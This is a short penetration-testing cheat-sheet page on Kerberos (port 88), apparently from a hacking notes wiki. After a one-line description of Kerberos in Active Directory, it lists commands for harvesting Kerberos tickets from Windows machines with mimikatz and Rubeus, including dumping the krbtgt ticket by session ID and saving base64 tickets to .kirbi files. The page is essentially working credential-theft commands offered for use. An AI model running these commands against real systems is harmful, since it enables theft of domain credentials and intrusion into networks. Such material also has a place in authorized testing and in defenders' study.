---
description: >-
  Kerberos is an authentication protocol, not authorization. Kerberos is used in
  AD networks. If you see this, odds are it is a Domain Controller (DC).
---

# ☠ 88/Kerberos

## Harvesting tickets from Windows

```
# Using mimikatz
sekurlsa::tickets /export
# Using Rubeus
## Dump all tickets
.\Rubeus dump
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))

## List all tickets
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
